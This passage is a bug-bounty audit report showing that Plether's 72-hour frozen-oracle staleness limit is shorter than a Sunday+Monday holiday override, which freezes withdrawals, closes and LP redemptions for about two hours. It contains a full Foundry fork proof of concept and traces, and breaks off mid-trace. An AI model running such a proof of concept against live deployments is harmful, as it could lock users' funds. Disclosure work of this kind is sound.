# \#99512 [SC-High] Frozen-mode staleness limit shorter than a Sunday + Monday holiday override in PletherOracle leads to temporary freezing of funds for at least 1 hour

**Submitted on Nov 13th 2026 at 23:46:08 UTC by @deltabear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99512
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro

When Pyth's FX market is shut for a holiday, the owner covers it with whole UTC-day overrides, as the security guide tells them to. When Christmas or New Year falls on a Monday, Pyth's own schedule shuts FX from Friday 17:00 to Monday 00:00 New York time, so the owner overrides Sunday and Monday. The protocol then stays oracle-frozen from Friday 22:00 to Tuesday 00:00 UTC, which is 74 hours. While frozen, every close, withdrawal, liquidation and LP settlement prices from the last Friday mark and rejects it once it is older than `fadMaxStaleness`, which is 72 hours in the release and on the live deployment. Nothing can refresh the mark while frozen, and a signed Pyth price is ignored. So for the last two hours of that Monday no trader can close or withdraw and no LP redemption can be funded. No attacker is needed; the trigger is the owner's documented calendar operation. On a fork of the live v2.0.0 deployment, with the production keeper's own Friday mark, a trader's 31,630.51 USDG withdrawal, its 1,000,000-unit close and a 100,000 USDG LP redemption all revert for 2 h 0 min 33 s.

## Vulnerability Details

1. The release `fadMaxStaleness` is `3 days` (`CfdEngine.sol:140`). The deploy scripts do not change it, and the live Engine returns 259200.
2. An override covers a whole UTC day. `applyCalendarConfig` floors each timestamp to a day number (`CfdEngine.sol:698-703`), and `marketStatus` returns frozen for all of that day (`libraries/MarketCalendarLib.sol:51-53`). The weekly freeze starts at the Friday 17:00 New York boundary, which is 22:00 UTC in standard time (`libraries/MarketCalendarLib.sol:13`, `:38-41`).
3. Pyth's published schedule for all six basket feeds is `America/New_York;O,O,O,O,0000-1700,C,1700-2400;1224/0000-1700,1231/0000-1700`. When 24 or 31 December is a Sunday, the Sunday evening session is dropped and FX reopens Monday 00:00 New York time (05:00 UTC). The owner's tool for this is the UTC-day override ("holiday hours still require governance-configured UTC-day overrides", `packages/perps/SECURITY.md:1337-1338`), so the closure needs Sunday and Monday. The frozen run is Friday 22:00 to Tuesday 00:00 UTC: 74 hours.
4. While frozen, the oracle prices every path from the stored Engine mark: order execution (`PletherOracle.sol:592-593`), mark refresh, liquidation and LP reconciliation (`PletherOracle.sol:754-756`), and the views (`PletherOracle.sol:575-577`). In frozen mode every one of these modes uses `fadMaxStaleness` as its age limit (`libraries/OracleFreshnessPolicyLib.sol:65-82`).
5. `_frozenBasket` reverts `PletherOracle__StalePrice` once the mark is older than that limit (`PletherOracle.sol:738-740`). A positioned withdrawal goes through `CfdEngine.checkWithdraw` (`CfdEngine.sol:730`) to the settlement sidecar, which reverts `CfdEngine__MarkPriceStale` on the same age check (`CfdEngineSettlementSidecar.sol:278-281`, `:381-392`).
6. The mark cannot be refreshed while frozen. `_resolveCurrentBasket` returns `_frozenBasket` before it reads the payload (`PletherOracle.sol:754-756`), and `getUpdateFee` returns 0 (`PletherOracle.sol:465-466`). The last live mark is the one installed before Friday's close. From that mark + 72 h + 1 s until Tuesday 00:00 UTC every exit reverts, and only the end of the UTC day lifts it.
7. Nothing compares the frozen run an override creates with `fadMaxStaleness`. `proposeCalendarConfig` checks only the runway (`CfdEngineAdmin.sol:155-160`) and `proposeFreshnessConfig` checks only for zero (`CfdEngineAdmin.sol:207-212`). The protocol promises the opposite outcome: "frozen-oracle windows prioritize close liveness" (`packages/perps/SECURITY.md:1332`) and "`oracleFrozen` keeps eligible synchronized LP settlement live" (`packages/perps/SECURITY.md:1387`). The repo's root `SECURITY.md:73` says the 72-hour value "covers weekends plus holiday Mondays".
8. Replay-only frozen pricing came in with `81919218` (PR #120), the fix the Cecuro report links for MED-28. Before it, frozen paths accepted a fresh Pyth update, so a tick published after Pyth reopened refreshed the mark inside the freeze.

### Vulnerable source code

**1. The release age limit for a frozen mark** @ packages/perps/src/CfdEngine.sol:139-140
```solidity
    /// @notice Maximum accepted mark age during an oracle-frozen window, in seconds.
    uint256 public fadMaxStaleness = 3 days;
```

**2. Override timestamps become whole UTC days** @ packages/perps/src/CfdEngine.sol:698-703
```solidity
        for (uint256 i; i < config.fadDayTimestamps.length; i++) {
            uint256 day = config.fadDayTimestamps[i] / 86_400;
            if (!fadDayOverrides[day]) {
                fadDayOverrides[day] = true;
                _fadOverrideDays.push(day);
            }
```

**3. An override day is frozen from 00:00 to 24:00 UTC** @ packages/perps/src/libraries/MarketCalendarLib.sol:51-53
```solidity
        if (todayOverride) {
            return (true, true);
        }
```

**4. Close execution prices from the stored mark while frozen** @ packages/perps/src/PletherOracle.sol:587-593
```solidity
    ) internal returns (BasketPrice memory basket, bool ok) {
        if (!policy.oracleFrozen) {
            return _resolveHistoricalOrderBasket(refundRecipient, pythUpdateData, request);
        }

        basket = _frozenBasket(PriceMode.OrderExecution, policy.maxStaleness);
        ok = true;
```

**5. Mark refresh, liquidation and LP settlement ignore the Pyth payload while frozen** @ packages/perps/src/PletherOracle.sol:754-756
```solidity
        if (policy.oracleFrozen) {
            return _frozenBasket(mode, policy.maxStaleness);
        }
```

**6. The stored mark is rejected after 72 hours** @ packages/perps/src/PletherOracle.sol:733-740
```solidity
        basket.price = engine.lastMarkPrice();
        basket.publishTime = engine.lastMarkTime();
        if (basket.price == 0 || basket.publishTime == 0) {
            revert PletherOracle__NoAcceptedBasket();
        }
        if (OracleFreshnessPolicyLib.isStale(basket.publishTime, maxStaleness, block.timestamp)) {
            revert PletherOracle__StalePrice(mode, bytes32(0), basket.publishTime, maxStaleness, block.timestamp);
        }
```

**7. Positioned withdrawals revert on the same mark age** @ packages/perps/src/CfdEngineSettlementSidecar.sol:278-281, :389-391
```solidity
        (bool priceFresh, uint256 price) = _liveMark(engine, host);
        if (!priceFresh) {
            revert ICfdEngineTypes.CfdEngine__MarkPriceStale();
        }
        uint64 markTime = engine.lastMarkTime();
        uint256 age = block.timestamp > markTime ? block.timestamp - markTime : 0;
        fresh = age <= _markPolicy(engine, host, OracleFreshnessPolicyLib.Mode.PoolReconcile).maxStaleness;
```

**8. The calendar proposal checks only the runway** @ packages/perps/src/CfdEngineAdmin.sol:155-160
```solidity
    function proposeCalendarConfig(
        ICfdEngineAdminHost.EngineCalendarConfig calldata config
    ) external onlyOwner {
        if (config.fadRunwaySeconds > 24 hours) {
            revert CfdEngineAdmin__RunwayTooLong();
        }
```

## Impact Details

- Impact row: **"Temporary freezing of funds for at least 1 hour"** (Medium). The freeze lasts 2 h 0 min 33 s (7,233 s), from Mon 21:59:27 UTC to Mon 23:59:59 UTC. The production keeper's last Friday mark is at Fri 21:59:26 UTC. In that window, trader `0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B` cannot withdraw its 31,630.51 USDG of free collateral. It cannot close its 1,000,000-unit LONG either, so its 164,823.52 USDG of margin stays locked. The LP's 100,000 USDG Junior redemption is not funded (`maxWithdraw` is 0). One second before the window, and again from Tue 00:00 UTC, the same calls pay out.
- Every positioned account and every LP redemption takes the same path, and liquidation takes the same frozen branch (`PletherOracle.sol:754-756`). At the Friday close used here, the deployment held at least 28 open positions with 1,193,555.19 USDG of margin, and the Junior tranche held 101,045,250 USDG (Arbitrum Sepolia MockUSDG).
- The trigger is the owner's calendar operation through the documented 72-hour timelock, with every other parameter at its release value. The program says: "A legitimate, documented trusted action that triggers a harmful bug is in scope." No document at `a82d4fef` tells the owner to raise `fadMaxStaleness` for a holiday. The only README line that did, from `86f50aa0`, was removed in `90915d97`.
- No user action ends it. In the PoC, the production keeper's signed Pyth refresh from Mon 22:30 UTC reverts `PletherOracle__StalePrice`. Production accepted that same transaction. The freeze ends only when the UTC day ends.
- It recurs on a fixed calendar. Every year in which 24 December is a Sunday freezes exits twice, on Monday 25 December and Monday 1 January: 2028, 2034 and 2045. Each run lasts from the last Friday mark + 72 h to Tuesday 00:00 UTC. With the keeper's last mark 34 s before Friday's close, that is 2 hours.
- Fix: make the frozen age limit cover the configured frozen run. Reject a calendar config whose longest frozen run exceeds `fadMaxStaleness`, or derive the limit from the start of the current frozen run. Raising the release value to 4 days closes the Sunday + Monday case.
- Dedup. Cecuro MED-20 and SC Audit Studio SC-M1 are frozen-window close and liquidation failures caused by the live component-divergence limit, and both are fixed. This report is about the mark age limit against the frozen run of a calendar override, which is a different root and a different fix. The MED-28 fix `81919218` made frozen mode replay-only, and that change turns the mismatch into this freeze. The program rule is: "For findings marked as fixed or Acknowledged in the reports above, a report on the same root cause is valid only if it shows that the fix at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8 is incomplete or introduces a new bug." `packages/perps/SECURITY.md:1337-1338` lists UTC-day overrides as a known limitation. That limitation is this report's trigger. The bug is the 72-hour age limit that the override's frozen run outlives.

## References

Age limit and calendar
- packages/perps/src/CfdEngine.sol:140 - `fadMaxStaleness = 3 days`
- packages/perps/src/CfdEngine.sol:698-703 - override timestamps floored to UTC days
- packages/perps/src/libraries/MarketCalendarLib.sol:13 - 22:00 UTC standard-time FX boundary
- packages/perps/src/libraries/MarketCalendarLib.sol:38-41 - Friday freeze start
- packages/perps/src/libraries/MarketCalendarLib.sol:51-53 - override day frozen all day
- packages/perps/src/CfdEngineAdmin.sol:155-160 - calendar proposal checks only the runway
- packages/perps/src/CfdEngineAdmin.sol:207-212 - freshness proposal checks only for zero

Frozen pricing
- packages/perps/src/libraries/OracleFreshnessPolicyLib.sol:65-82 - `fadMaxStaleness` for every frozen mode
- packages/perps/src/PletherOracle.sol:575-577 - views use the frozen mark
- packages/perps/src/PletherOracle.sol:592-593 - order execution uses the frozen mark
- packages/perps/src/PletherOracle.sol:754-756 - payload ignored while frozen
- packages/perps/src/PletherOracle.sol:738-740 - `PletherOracle__StalePrice`
- packages/perps/src/PletherOracle.sol:465-466 - zero update fee while frozen
- packages/perps/src/CfdEngine.sol:730 - `checkWithdraw`
- packages/perps/src/CfdEngineSettlementSidecar.sol:278-281, :381-392 - `CfdEngine__MarkPriceStale`

Documentation
- packages/perps/SECURITY.md:1332 - "frozen-oracle windows prioritize close liveness"
- packages/perps/SECURITY.md:1337-1338 - "holiday hours still require governance-configured UTC-day overrides"
- packages/perps/SECURITY.md:1387 - "`oracleFrozen` keeps eligible synchronized LP settlement live"
- SECURITY.md:73 - "The 72-hour tolerance covers weekends plus holiday Mondays."

History and audits
- commit 86f50aa0 - adds overrides and `fadMaxStaleness = 3 days`; README says to tune it "for extended holiday stretches"
- commit 90915d97 - removes that README line
- commit 81919218 (PR #120) - frozen mode replays only the Engine mark
- audits/plether-ai-audit-report-2026-10-26.pdf, MED-20 and MED-28
- audits/plether-pre-audit-report.pdf, SC-M1

Deployment data (gist)
- `production-config-cast.txt` - live `fadMaxStaleness` 259200, runway 3600, timelock 259200, no pending change
- `deployed-code-vs-manifest.txt` - deployed bytecode of all 12 touched contracts equals the v2.0.0 manifest
- `production-keeper-txs.json` - the three replayed keeper transactions, all `status 0x1`
- `pyth-hermes-fx-price-feeds.json` - Pyth's schedule for the six feeds



## Link to Proof of Concept

https://gist.github.com/decies-centena-millia/40113ad636a600b19855c324458481e9

## Proof of Concept

## Proof of Concept

One Foundry test file in the repo's own `packages/perps` suite at `a82d4fef`, run on a fork of the live v2.0.0 deployment on Arbitrum Sepolia. The owner makes the Sunday + Monday override through the timelock, and the production keeper's own `updateMarkPrice` transactions are replayed with `vm.transact`. The trader, the LP, the configuration and every number come from the deployed contracts.

All files and every raw output (`-vv`, one `-vvvv` trace per test, versions, live config, bytecode check, replayed transactions, Pyth schedule, SHA-256 sums) are in the secret gist: https://gist.github.com/decies-centena-millia/40113ad636a600b19855c324458481e9

```bash
git clone --recurse-submodules https://github.com/immunefi-team/audit-comp-plether.git && cd audit-comp-plether && git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8 && git submodule update --init --recursive
mkdir -p packages/perps/test/poc_mondayoverride && cp MondayOverrideStaleFreezePoC.t.sol packages/perps/test/poc_mondayoverride/ && cd packages/perps && ARB_SEPOLIA_RPC_URL=https://arbitrum-sepolia.gateway.tenderly.co forge test --match-path 'test/poc_mondayoverride/*' -vvvv
```

### attack step-by-step

1. Thu 2026-11-05 12:00 UTC, fork block 326,289,945. The owner proposes overrides for Sunday 8 and Monday 9 November with the live runway (3600 s).
2. The production keeper's last `updateMarkPrice` before Friday's close (tx `0xd94c6398ee2c3450b9de883d02c761434b0a2e074f716f7866f82ead0108293f`) installs the mark at Fri 21:59:26 UTC.
3. Sun 12:00 UTC: the timelock elapses and the owner finalizes the overrides. The market is now frozen without a break from Fri 22:00 to Tue 00:00 UTC.
4. At Mon 10:00 UTC and at Mon 21:59:26 UTC (mark exactly 72 h old), the trader withdraws its free USDG and fully closes, and the LP's redemption is settled and paid.
5. At Mon 21:59:27 UTC and at Mon 23:59:59 UTC, the same withdrawal, close execution and LP settlement revert. The production keeper's Pyth refresh at Mon 22:30:15 UTC (tx `0x69b1abc439eaf22f3ef1dea563937224637fd4eef0773641f9f2315604a66fa3`) reverts too.
6. Tue 00:00 UTC the override day ends, the production refresh at 00:00:28 (tx `0x8142dd849c51c16d84889b2a371b8c9a21ca4d32c5d29cd910a926b48920355b`) lands, and the withdrawal pays out again.

## main Attack code

```solidity
// owner: cover the Sunday + Monday FX closure with UTC-day overrides, through the 72 h timelock
vm.prank(OWNER);
ADMIN.proposeCalendarConfig(ICfdEngineAdminHost.EngineCalendarConfig(dayList, runway)); // [SUNDAY, MONDAY], 3600
vm.transact(FRI_LAST_MARK_TX); // production keeper's last mark, Fri 21:59:26 UTC
_warpTo(ADMIN.calendarConfigActivationTime());
vm.prank(OWNER);
ADMIN.finalizeCalendarConfig();

// mark + 72 h + 1 s: every exit reverts until Tuesday 00:00 UTC
vm.prank(TRADER);
vm.expectRevert(ICfdEngineTypes.CfdEngine__MarkPriceStale.selector);
CLEARINGHOUSE.withdraw(TRADER, free);

vm.prank(PROD_KEEPER);
vm.expectRevert(_stale(IPletherOracle.PriceMode.OrderExecution, t));
ROUTER.executeOrder(id, new bytes[](0));

vm.prank(PROD_KEEPER);
vm.expectRevert(_stale(IPletherOracle.PriceMode.PoolReconcile, t));
ROUTER.settleLpEpoch(new bytes[](0));
```

```
plant : the owner finalizes Sunday + Monday overrides; the keeper's last live mark lands before Friday's close
fire  : from mark + 72 h + 1 s on Monday, withdraw, executeOrder and settleLpEpoch revert until 00:00 UTC
```

### full poc code, single file, single runnable command

Foundry `forge 1.8.5` (commit `51a52c59`), `solc 0.8.35`, `via_ir = true`, `optimizer_runs = 200`, from the repo's own unmodified `packages/perps/foundry.toml`. Submodules are at the commits `a82d4fef` pins: forge-std `f5495c9b`, morpho-blue `55d2d993`, openzeppelin-contracts `fcbae539`. The fork needs one environment variable, `ARB_SEPOLIA_RPC_URL`, for any Arbitrum Sepolia archive RPC; the test defaults to `https://arbitrum-sepolia.gateway.tenderly.co`. The in-scope code runs as the deployed v2.0.0 bytecode. `packages/perps/src` has the same git tree hash (`fff196b1b2a5bf6e9bfdc94fdb123c7854fe1252`) at `a82d4fef`, at the deployed tag v2.0.0 (`1209ca8a`) and at upstream `master` (`6909f261`).

`MondayOverrideStaleFreezePoC.t.sol`
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {Test} from "forge-std/Test.sol";

interface IRouterWindow {
    function maxExecutionWindowSeconds() external view returns (uint256);
}

/// Fork of the live Plether perps v2.0.0 deployment on Arbitrum Sepolia (the program's fork target).
/// Governance covers a weekend + Monday FX holiday with UTC-day overrides, as SECURITY.md:1337-1338 requires.
/// The frozen run is then 74 h, but the release fadMaxStaleness is 72 h, so every exit reverts for the last 2 h of Monday.
contract MondayOverrideStaleFreezePoC is Test {
    // deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json
    CfdEngine internal constant ENGINE = CfdEngine(0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA);
    CfdEngineAdmin internal constant ADMIN = CfdEngineAdmin(0xfA444C18C90f1b5F768edDBb56cD1d92710A8327);
    OrderRouter internal constant ROUTER = OrderRouter(payable(0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444));
    MarginClearinghouse internal constant CLEARINGHOUSE = MarginClearinghouse(0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A);
    TrancheVault internal constant JUNIOR = TrancheVault(0x4A8b67184a1E3224c11A191cc69F22C50EEf734e);
    address internal constant OWNER = 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B;
    address internal constant PROD_KEEPER = 0x1329A7Fa975F2F8aA2cAc86A833f03655201d34f;
    // Real trader: 1,000,000-unit LONG held through the 6-9 Nov 2026 weekend.
    address internal constant TRADER = 0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B;
    // The deployer is the pool's only Junior LP on v2.0.0 (about 101M USDG).
    address internal constant LP = OWNER;
    uint256 internal constant LP_EXIT_ASSETS = 100_000e6;

    uint256 internal constant FORK_BLOCK = 326_289_945; // Thu 2026-11-05 12:00:00 UTC
    // Production keeper's updateMarkPrice txs, replayed as mined.
    bytes32 internal constant FRI_LAST_MARK_TX = 0xd94c6398ee2c3450b9de883d02c761434b0a2e074f716f7866f82ead0108293f;
    bytes32 internal constant MON_2230_MARK_TX = 0x69b1abc439eaf22f3ef1dea563937224637fd4eef0773641f9f2315604a66fa3;
    bytes32 internal constant TUE_0000_MARK_TX = 0x8142dd849c51c16d84889b2a371b8c9a21ca4d32c5d29cd910a926b48920355b;
    uint256 internal constant FRI_LAST_MARK = 1_794_002_366; // Fri 21:59:26 UTC, 34 s before the 22:00 UTC FX close
    uint256 internal constant FRI_LAST_PRICE = 96_101_009;
    uint256 internal constant MON_2230_TX_TIME = 1_794_263_415;
    uint256 internal constant TUE_0000_TX_TIME = 1_794_268_828;
    uint256 internal constant MON_2230_MARK = 1_794_263_414;
    uint256 internal constant TUE_0000_MARK = 1_794_268_824;

    uint256 internal constant SUNDAY = 1_794_096_000; // Sun 2026-11-08 00:00:00 UTC
    uint256 internal constant MONDAY = SUNDAY + 1 days;
    uint256 internal constant TUESDAY = MONDAY + 1 days;

    uint256 internal nonce;

    function _rpc() internal view returns (string memory) {
        return vm.envOr("ARB_SEPOLIA_RPC_URL", string("https://arbitrum-sepolia.gateway.tenderly.co"));
    }

    function setUp() public {
        vm.createSelectFork(_rpc(), FORK_BLOCK);
        // Live production config, read from the deployed contracts.
        assertEq(ENGINE.fadMaxStaleness(), 3 days, "fadMaxStaleness");
        assertEq(ENGINE.fadRunwaySeconds(), 1 hours, "fadRunwaySeconds");
        assertEq(ADMIN.TIMELOCK_DELAY(), 72 hours, "timelock");
        assertEq(ADMIN.calendarConfigActivationTime(), 0, "no pending calendar change");
        assertFalse(ENGINE.fadDayOverrides(SUNDAY / 1 days));
        assertFalse(ENGINE.fadDayOverrides(MONDAY / 1 days));
    }

    function test_mondayHolidayOverrideFreezesAllExitsForTwoHours() public {
        // 1. Owner covers a Sunday + Monday FX closure (Pyth's 24/31 Dec rule) with UTC-day overrides, via the 72 h timelock.
        uint256[] memory dayList = new uint256[](2);
        dayList[0] = SUNDAY;
        dayList[1] = MONDAY;
        uint256 runway = ENGINE.fadRunwaySeconds();
        vm.prank(OWNER);
        ADMIN.proposeCalendarConfig(ICfdEngineAdminHost.EngineCalendarConfig(dayList, runway));

        // 2. The production keeper installs its last live mark before Friday's close.
        vm.transact(FRI_LAST_MARK_TX);
        assertEq(ENGINE.lastMarkTime(), FRI_LAST_MARK);
        assertEq(ENGINE.lastMarkPrice(), FRI_LAST_PRICE);

        _warpTo(ADMIN.calendarConfigActivationTime());
        vm.prank(OWNER);
        ADMIN.finalizeCalendarConfig();
        assertTrue(ENGINE.fadDayOverrides(SUNDAY / 1 days));
        assertTrue(ENGINE.fadDayOverrides(MONDAY / 1 days));

        // 3. Control: while the mark is at most 72 h old, frozen exits work.
        _exitsWork(MONDAY + 10 hours);
        _exitsWork(FRI_LAST_MARK + 3 days);

        // 4. From 72 h + 1 s until the override day ends, every exit reverts.
        _exitsBlocked(FRI_LAST_MARK + 3 days + 1);
        _exitsBlocked(TUESDAY - 1);

        // 5. A genuine signed Pyth update from Mon 22:30 UTC is refused while frozen.
        _warpTo(MON_2230_TX_TIME);
        vm.transact(MON_2230_MARK_TX);
        assertEq(ENGINE.lastMarkTime(), FRI_LAST_MARK, "real Pyth update refused");

        // 6. Only when the UTC day ends does the system leave frozen mode and accept data again.
        _warpTo(TUESDAY);
        assertFalse(ENGINE.isOracleFrozen());
        _warpTo(TUE_0000_TX_TIME);
        vm.transact(TUE_0000_MARK_TX);
        assertEq(ENGINE.lastMarkTime(), TUE_0000_MARK);
        uint256 free = CLEARINGHOUSE.getFreeBuyingPowerAssets(TRADER);
        vm.prank(TRADER);
        CLEARINGHOUSE.withdraw(TRADER, free);
    }

    /// On the real chain (no override) the same three keeper txs were accepted.
    function test_productionAcceptedTheReplayedTicks() public {
        vm.createSelectFork(_rpc(), 326_744_777); // block of FRI_LAST_MARK_TX
        assertEq(ENGINE.lastMarkTime(), FRI_LAST_MARK);
        assertEq(ENGINE.lastMarkPrice(), FRI_LAST_PRICE);
        vm.createSelectFork(_rpc(), 327_683_927); // block of MON_2230_MARK_TX
        assertFalse(ENGINE.isOracleFrozen());
        assertEq(ENGINE.lastMarkTime(), MON_2230_MARK);
        vm.createSelectFork(_rpc(), 327_702_306); // block of TUE_0000_MARK_TX
        assertEq(ENGINE.lastMarkTime(), TUE_0000_MARK);
    }

    function _exitsWork(uint256 t) internal {
        uint256 snap = vm.snapshotState();
        uint64 id = _setupExits(t);
        assertTrue(ENGINE.isOracleFrozen());

        uint256 free = CLEARINGHOUSE.getFreeBuyingPowerAssets(TRADER);
        vm.prank(TRADER);
        CLEARINGHOUSE.withdraw(TRADER, free);

        vm.prank(PROD_KEEPER);
        OrderV3Types.ExecutionResult memory r = ROUTER.executeOrder(id, new bytes[](0));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 size,,,,,,) = ENGINE.positions(TRADER);
        assertEq(size, 0);

        vm.prank(PROD_KEEPER);
        ROUTER.settleLpEpoch(new bytes[](0));
        uint256 claim = JUNIOR.maxWithdraw(LP);
        assertGt(claim, 0);
        vm.prank(LP);
        JUNIOR.withdraw(claim, LP, LP);
        vm.revertToState(snap);
    }

    function _exitsBlocked(uint256 t) internal {
        uint256 snap = vm.snapshotState();
        uint64 id = _setupExits(t);
        assertTrue(ENGINE.isOracleFrozen());

        uint256 free = CLEARINGHOUSE.getFreeBuyingPowerAssets(TRADER);
        vm.prank(TRADER);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__MarkPriceStale.selector);
        CLEARINGHOUSE.withdraw(TRADER, free);

        vm.prank(PROD_KEEPER);
        vm.expectRevert(_stale(IPletherOracle.PriceMode.OrderExecution, t));
        ROUTER.executeOrder(id, new bytes[](0));

        vm.prank(PROD_KEEPER);
        vm.expectRevert(_stale(IPletherOracle.PriceMode.PoolReconcile, t));
        ROUTER.settleLpEpoch(new bytes[](0));
        assertEq(JUNIOR.maxWithdraw(LP), 0);
        vm.revertToState(snap);
    }

    /// LP asks to redeem one epoch before t, the trader commits a full close 1 s before t.
    function _setupExits(uint256 t) internal returns (uint64 id) {
        _warpTo((t / 1 hours) * 1 hours - 1 hours);
        uint256 shares = JUNIOR.convertToShares(LP_EXIT_ASSETS);
        vm.prank(LP);
        JUNIOR.requestRedeem(shares, LP, LP);
        _warpTo(t - 1);
        id = _commitFullClose();
        _warpTo(t);
    }

    function _commitFullClose() internal returns (uint64 id) {
        (uint256 size,,,, CfdTypes.Side side,,) = ENGINE.positions(TRADER);
        uint256 window = IRouterWindow(address(ROUTER)).maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory req;
        req.clientOrderId = keccak256(abi.encode("monday-override-close", nonce++));
        req.side = side;
        req.sizeDelta = size;
        req.targetPrice = side == CfdTypes.Side.LONG ? type(uint256).max : 1;
        req.isClose = true;
        req.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: ROUTER.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        vm.prank(TRADER);
        id = ROUTER.commitOrder(req);
    }

    function _stale(IPletherOracle.PriceMode mode, uint256 t) internal pure returns (bytes memory) {
        return abi.encodeWithSelector(
            IPletherOracle.PletherOracle__StalePrice.selector, mode, bytes32(0), FRI_LAST_MARK, 3 days, t
        );
    }

    function _warpTo(uint256 t) internal {
        vm.warp(t);
        vm.roll(block.number + 1);
    }
}
```

### Output

`forge test --match-path 'test/poc_mondayoverride/*' -vv` (gist `forge-test-vv.log`)
```
No files changed, compilation skipped

Ran 2 tests for test/poc_mondayoverride/MondayOverrideStaleFreezePoC.t.sol:MondayOverrideStaleFreezePoC
[PASS] test_mondayHolidayOverrideFreezesAllExitsForTwoHours() (gas: 16225842)
[PASS] test_productionAcceptedTheReplayedTicks() (gas: 51756)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.55s (1.66s CPU time)

Ran 1 test suite in 1.56s (1.55s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

Raw `-vvvv` trace excerpts, from gist `forge-test-vvvv-test_mondayHolidayOverrideFreezesAllExitsForTwoHours.log`. Line numbers are that file's.

Control, Mon 21:59:26 UTC, mark exactly 72 h old. The trader's withdrawal pays out (lines 1712-1724, 1866-1870)
```
    ├─ [0] VM::warp(1794261566 [1.794e9])
    │   └─ ← [Return]
    ├─ [0] VM::roll(12069339 [1.206e7])
    │   └─ ← [Return]
    ├─ [13252] 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA::isOracleFrozen() [staticcall]
    │   ├─ [572] 0x802a0755413FB966b397155b5c5CC0198E6BEd3F::marketCalendarStatus(1794261566 [1.794e9], true, false, 3600) [staticcall]
    │   │   └─ ← [Return] true, true
    │   └─ ← [Return] true
    ├─ [12536] 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A::getFreeBuyingPowerAssets(0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B) [staticcall]
    │   └─ ← [Return] 31630512978 [3.163e10]
    ├─ [0] VM::prank(0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B)
    │   └─ ← [Return]
    ├─ [516075] 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A::withdraw(0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B, 31630512978 [3.163e10])
    │   ├─ [24830] 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D::transfer(0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B, 31630512978 [3.163e10])
    │   │   ├─ emit Transfer(from: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, to: 0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B, amount: 31630512978 [3.163e10])
    │   │   └─ ← [Return] true
    │   ├─ emit Withdraw(account: 0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B, asset: 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D, amount: 31630512978 [3.163e10])
    │   └─ ← [Stop]
```

Same second. The full close executes (`status: 2` is Executed) (lines 2357-2359, 2403-2405)
```
    │   │   │   │   │   │   ├─ emit ActionChargeSettled(account: 0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B, assessedAssets: 3073899794 [3.073e9], recoveredAssets: 3073899794 [3.073e9], waivedAssets: 0)
    │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   ├─ emit PositionClosed(account: 0xA01112bBd4CAc53611e9E4651047E6Ea7f60701B, side: 0, sizeDelta: 1000000000000000000000000 [1e24], price: 96101009 [9.61e7], pnl: 6296983000 [6.296e9])
    │   │   │   └─ ← [Return] ExecutionResult({ orderId: 148, status: 2, terminalReason: 1, pendingReason: 0, receiptHash: 0x9a9a3ff655d487924f59fc5c2b9aac2eed9a0c43e4ef57c8d1f15c53cb29774f })
    │   │   └─ ← [Return] ExecutionResult({ orderId: 148, status: 2, terminalReason: 1, pendingReason: 0, receiptHash: 0x9a9a3ff655d487924f59fc5c2b9aac2eed9a0c43e4ef57c8d1f15c53cb29774f })
    │   └─ ← [Return] ExecutionResult({ orderId: 148, status: 2, terminalReason: 1, pendingReason: 0, receiptHash: 0x9a9a3ff655d487924f59fc5c2b9aac2eed9a0c43e4ef57c8d1f15c53cb29774f })
```

Same second. The LP's redemption is funded and paid (lines 2554-2561)
```
